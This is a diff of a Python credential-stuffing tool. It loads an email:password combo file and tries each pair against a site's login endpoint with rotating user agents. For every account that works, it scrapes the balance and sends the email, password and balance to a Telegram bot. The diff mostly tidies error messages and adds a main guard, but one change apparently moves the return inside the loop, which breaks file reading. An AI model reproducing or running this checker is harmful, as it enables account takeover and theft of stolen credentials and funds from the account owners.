@@ -1,7 +1,6 @@
 import http.client
 import urllib.parse
 import random
-import sys
 import os
 import pyfiglet
 from colorama import Fore, Style, init
@@ -9,10 +8,10 @@ from colorama import Fore, Style, init
 # Initialize colorama
 init(autoreset=True)
 
-GREY = Fore.LIGHTBLACK_EX  # Light grey
-RED = Fore.RED  # Red
-GREEN = Fore.GREEN  # Green
-BLUE = Fore.BLUE  # Blue
+GREY = Fore.LIGHTBLACK_EX
+RED = Fore.RED
+GREEN = Fore.GREEN
+BLUE = Fore.BLUE
 RESET = Style.RESET_ALL
 
 def print_banner(title):
@@ -34,12 +33,12 @@ def read_credentials_from_file(file_name):
                     credentials.append(parts)
                 else:
                     print(RED + f"❌ Invalid Format: {line.strip()} - Expected format email:password")
-        return credentials
+            return credentials
     except FileNotFoundError:
         print(RED + "❌ File not found!")
         return []
     except Exception as error:
-        print(RED + "❌ File reading error:", error)
+        print(RED + f"❌ File reading error: {error}")
         return []
 
 def login(email, password, user_agent):
@@ -64,7 +63,7 @@ def login(email, password, user_agent):
         cookies = response.getheader("Set-Cookie")
         return response.status, data, cookies
     except Exception as error:
-        print(RED + "Request error:", error)
+        print(RED + f"❌ Request error: {error}")
         return None, None, None
 
 def get_balance(cookies, user_agent):
@@ -86,7 +85,7 @@ def get_balance(cookies, user_agent):
             print(RED + "❌ Cannot access the panel page!")
             return None
     except Exception as error:
-        print(RED + "❌ Request error:", error)
+        print(RED + f"❌ Request error: {error}")
         return None
 
 def parse_balance(html):
@@ -103,7 +102,7 @@ def parse_balance(html):
         balance_str = html[start_index:end_index].strip()
         return balance_str
     except Exception as error:
-        print(RED + "❌ Parsing error:", error)
+        print(RED + f"❌ Parsing error: {error}")
         return None
 
 def send_telegram_message(bot_token, chat_id, message):
@@ -120,12 +119,12 @@ def send_telegram_message(bot_token, chat_id, message):
         if response.status != 200:
             print(RED + f"❌ Failed to send to bot: {response_text}")
     except Exception as error:
-        print(RED + "❌ Failed to send to bot:", error)
+        print(RED + f"❌ Failed to send to bot: {error}")
 
 def scan_accounts(file_name, bot_token, chat_id, success_message):
     credentials = read_credentials_from_file(file_name)
     if not credentials:
-        print(RED + "❌ File not found or incorrect file path!")
+        print(RED + "❌ No valid credentials found!")
         return
 
     user_agents = [
@@ -152,16 +151,16 @@ def scan_accounts(file_name, bot_token, chat_id, success_message):
 
         response_text = response_data.decode()
         if any(condition in response_text for condition in failed_conditions):
-            print(f"❌{RED}{email} : {password} | Invalid account!")
+            print(f"❌{RED} {email} : {password} | Invalid account!")
         elif any(condition in response_text for condition in success_conditions):
-            print(f"✅{GREEN}Login successful: {email} : {password}")
+            print(f"✅{GREEN} Login successful: {email} : {password}")
             balance = get_balance(cookies, user_agent)
             if balance is not None:
                 send_telegram_message(bot_token, chat_id, success_message.format(email=email, password=password, balance=balance))
             else:
                 print(RED + "❌ Could not retrieve balance.")
         else:
-            print(f"❌ {RED}{email} : An unknown error occurred.")
+            print(f"❌ {RED} {email} : An unknown error occurred.")
 
 def main():
     bot_token = input(f"{BLUE}Enter Bot Token: {GREY}")
@@ -171,4 +170,5 @@ def main():
     file_name = input(f"{BLUE}Enter Combo File Path: {GREY}")
     scan_accounts(file_name, bot_token, chat_id, success_message)
 
-main()
+if __name__ == "__main__":
+    main()
